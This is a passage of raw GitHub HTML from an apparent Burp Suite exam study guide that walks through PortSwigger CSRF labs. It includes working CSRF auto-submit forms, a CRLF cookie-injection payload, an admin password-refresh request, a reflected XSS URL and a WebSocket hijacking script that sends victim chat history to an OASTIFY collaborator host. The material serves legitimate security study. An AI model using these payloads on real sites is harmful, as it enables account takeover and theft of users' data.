class=\"pl-ent\"\u003ebody\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehtml\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie\" rel=\"nofollow\"\u003ePortSwigger Lab: CSRF where token is tied to non-session cookie\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCSRF duplicated in cookie\u003c/h3\u003e\u003ca id=\"user-content-csrf-duplicated-in-cookie\" class=\"anchor\" aria-label=\"Permalink: CSRF duplicated in cookie\" href=\"#csrf-duplicated-in-cookie\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the target we \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e that the CSRF key token is duplicated in the cookie value. Another \u003cem\u003e\u003cstrong\u003eindicator\u003c/strong\u003e\u003c/em\u003e is the cookie \u003ccode\u003eLastSearchTerm\u003c/code\u003e contain the value searched. By giving search value that contain \u003ccode\u003e%0d%0a\u003c/code\u003e we can inject an \u003cstrong\u003eend of line\u003c/strong\u003e and \u003cstrong\u003enew line\u003c/strong\u003e characters to create new CSRF cookie and value.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/set-cookie-csrf-fake.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/set-cookie-csrf-fake.png\" alt=\"set cookie csrf fake\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the exploit code \u003ccode\u003eimg src\u003c/code\u003e tag we set cookie for csrf to fake.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;html\u0026gt;\n  \u0026lt;body\u0026gt;\n    \u0026lt;form action=\u0026quot;https://TARGET.net/my-account/change-email\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;email\u0026quot; value=\u0026quot;ATTACKER\u0026amp;#64;EXPLOIT-SERVER\u0026amp;#46;NET\u0026quot; /\u0026gt;\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;csrf\u0026quot; value=\u0026quot;fake\u0026quot; /\u0026gt;\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit request\u0026quot; /\u0026gt;\n    \u0026lt;/form\u0026gt;\n    \u0026lt;img src=\u0026quot;https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None\u0026quot; onerror=\u0026quot;document.forms[0].submit();\u0026quot;/\u0026gt;\n  \u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehtml\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebody\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eform\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eaction\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://TARGET.net/my-account/change-email\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003emethod\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ePOST\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehidden\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003ename\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eemail\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003evalue\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eATTACKER\u0026amp;#64;EXPLOIT-SERVER\u0026amp;#46;NET\u003c/span\u003e\" \u003cspan class=\"pl-kos\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehidden\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003ename\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ecsrf\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003evalue\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003efake\u003c/span\u003e\" \u003cspan class=\"pl-kos\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003esubmit\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003evalue\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eSubmit request\u003c/span\u003e\" \u003cspan class=\"pl-kos\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eform\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eimg\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003eonerror\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003edocument.forms[0].submit();\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e/\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebody\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehtml\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-duplicated-cookie.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf-duplicated-cookie.png\" alt=\"csrf duplicated cookie\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie\" rel=\"nofollow\"\u003ePortSwigger Lab: CSRF where token is duplicated in cookie\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCSRF Token Present\u003c/h3\u003e\u003ca id=\"user-content-csrf-token-present\" class=\"anchor\" aria-label=\"Permalink: CSRF Token Present\" href=\"#csrf-token-present\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eChanging the value of the \u003ccode\u003ecsrf\u003c/code\u003e parameter result in change email request being \u003cstrong\u003erejected\u003c/strong\u003e. Deleting the CSRF token allow the change email to be \u003cstrong\u003eaccepted\u003c/strong\u003e, and this \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e that the validation of token being present is vulnerable.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCSRF PoC Payload hosted on exploit server:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;form method=\u0026quot;POST\u0026quot; action=\u0026quot;https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email\u0026quot;\u0026gt;\n    \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;$param1name\u0026quot; value=\u0026quot;$param1value\u0026quot;\u0026gt;\n\u0026lt;/form\u0026gt;\n\u0026lt;script\u0026gt;\n    document.forms[0].submit();\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eform\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003emethod\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ePOST\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003eaction\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://YOUR-LAB-ID.web-security-academy.net/my-account/change-email\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehidden\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003ename\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003e$param1name\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003evalue\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003e$param1value\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eform\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eforms\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003esubmit\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-present-validation-fail.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf-present-validation-fail.png\" alt=\"csrf present validation fail\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present\" rel=\"nofollow\"\u003ePortSwigger Lab: CSRF where token validation depends on token being present\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eIs Logged In\u003c/h3\u003e\u003ca id=\"user-content-is-logged-in\" class=\"anchor\" aria-label=\"Permalink: Is Logged In\" href=\"#is-logged-in\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIf cookie with the \u003cstrong\u003eisloggedin\u003c/strong\u003e name is \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e, then a refresh of admin password POST request could be exploited.\u003cbr\u003e\nChange username parameter to administrator while logged in as low privilege user.\u003cbr\u003e\nCSRF token is not tied to user session.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"POST /refreshpassword HTTP/1.1\nHost: TARGET.net\nCookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d\nContent-Length: 60\nCache-Control: max-age=0\nSec-Ch-Ua: \u0026quot;Chromium\u0026quot;;v=\u0026quot;109\u0026quot;, \u0026quot;Not_A Brand\u0026quot;;v=\u0026quot;99\u0026quot;\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \u0026quot;Linux\u0026quot;\nUpgrade-Insecure-Requests: 1\nOrigin: https://TARGET.net\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;\nX-Forwarded-Host: EXPLOIT.net\nX-Host: EXPLOIT.net\nX-Forwarded-Server: EXPLOIT.net\nReferer: https://TARGET.net/refreshpassword\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\ncsrf=TOKEN\u0026amp;username=administrator\"\u003e\u003cpre\u003ePOST /refreshpassword HTTP/1.1\nHost: TARGET.net\nCookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d\nContent-Length: 60\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Linux\"\nUpgrade-Insecure-Requests: 1\nOrigin: https://TARGET.net\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;\nX-Forwarded-Host: EXPLOIT.net\nX-Host: EXPLOIT.net\nX-Forwarded-Server: EXPLOIT.net\nReferer: https://TARGET.net/refreshpassword\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\ncsrf=TOKEN\u0026amp;username=administrator\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-privesc.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf-privesc.png\" alt=\"CSRF privesc\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCSRF No Defences\u003c/h3\u003e\u003ca id=\"user-content-csrf-no-defences\" class=\"anchor\" aria-label=\"Permalink: CSRF No Defences\" href=\"#csrf-no-defences\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTarget with no defences against email change function, can allow the privilege escalation to admin role. In the exam changing the email to the \u003ccode\u003eattacker@EXPLOIT.NET\u003c/code\u003e email address on the exploit server can allow the attacker to change the password of the admin user, resulting in privilege escalation.\u003cbr\u003e\nIn the exam there is only \u003cem\u003e\u003cstrong\u003eone\u003c/strong\u003e\u003c/em\u003e active user, and if the previous stage was completed using an attack that did not require the involving of the active user clicking on a link by performing poison cache or performing phishing attack by means of \u003ccode\u003eDeliver to Victim\u003c/code\u003e function, then CSRF change exploit can be used.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-change-email.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf-change-email.png\" alt=\"csrf-change-email.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/csrf/lab-no-defenses\" rel=\"nofollow\"\u003ePortSwigger Lab: CSRF vulnerability with no defences\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSameSite Strict bypass\u003c/h3\u003e\u003ca id=\"user-content-samesite-strict-bypass\" class=\"anchor\" aria-label=\"Permalink: SameSite Strict bypass\" href=\"#samesite-strict-bypass\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the live chat function, we notice the \u003ccode\u003eGET /chat HTTP/2\u003c/code\u003e request do not use any unpredictable tokens, this can \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e possible  \u003ca href=\"https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking\" rel=\"nofollow\"\u003ecross-site WebSocket hijacking\u003c/a\u003e (CSWSH) vulnerability if possible to bypass \u003ca href=\"https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions\" rel=\"nofollow\"\u003eSameSite\u003c/a\u003e cookie restriction.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eHost on exploit server POC payload to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e CSWSH vulnerability.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\n    var ws = new WebSocket('wss://TARGET.net/chat');\n    ws.onopen = function() {\n        ws.send(\u0026quot;READY\u0026quot;);\n    };\n    ws.onmessage = function(event) {\n        fetch('https://OASTIFY.COM', {method: 'POST', mode: 'no-cors', body: event.data});\n    };\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;script\u0026gt;\n    var ws = new WebSocket('wss://TARGET.net/chat');\n    ws.onopen = function() {\n        ws.send(\"READY\");\n    };\n    ws.onmessage = function(event) {\n        fetch('https://OASTIFY.COM', {method: 'POST', mode: 'no-cors', body: event.data});\n    };\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe \u003ccode\u003eSameSite=Strict\u003c/code\u003e is set for session cookies and this prevent the browser from including these cookies in XSS cross-site requests. We \u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e the header \u003ccode\u003eAccess-Control-Allow-Origin\u003c/code\u003e in additional requests to script and images to a subdomain at \u003ccode\u003ecms-\u003c/code\u003e.\u003cbr\u003e\nBrowsing to this CDN subdomain at \u003ccode\u003ecms-\u003c/code\u003e and then \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e that random user name input is reflected, confirmed this to be a \u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\" rel=\"nofollow\"\u003ereflected XSS\u003c/a\u003e vulnerability.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/cms-reflected-xss-samesite-bypass.png\"\u003ecms reflected xss samesite bypass\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"https://cms-TARGET.net/login?username=%3Cscript%3Ealert%28%27reflectXSS%27%29%3C%2Fscript%3E\u0026amp;password=pass\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ehttps://cms-TARGET.net/login?username=%3Cscript%3Ealert%28%27reflectXSS%27%29%3C%2Fscript%3E\u0026amp;password=pass\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBypass the SameSite restrictions, by URL encode the entire script below and using it as the input to the CDN subdomain at \u003ccode\u003ecms-\u003c/code\u003e username login, hosted on exploit server.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\n    var ws = new WebSocket('wss://TARGE.net/chat');\n    ws.onopen = function() {\n        ws.send(\u0026quot;READY\u0026quot;);\n    };\n    ws.onmessage = function(event) {\n        fetch('https://OASTIFY.COM', {method: 'POST', mode: 'no-cors', body: event.data});\n    };\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;script\u0026gt;\n    var ws = new WebSocket('wss://TARGE.net/chat');\n    ws.onopen = function() {\n        ws.send(\"READY\");\n    };\n    ws.onmessage = function(event) {\n        fetch('https://OASTIFY.COM', {method: 'POST', mode: 'no-cors', body: event.data});\n    };\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eHost the following on exploit server and deliver to victim, once the collaborator receive the victim chat history with their password, result in account takeover.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\n    document.location = \u0026quot;https://cms-TARGET.net/login?username=ENCODED-POC-CSWSH-SCRIPT\u0026amp;password=Peanut2019\u0026quot;;\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;script\u0026gt;\n    document.location = 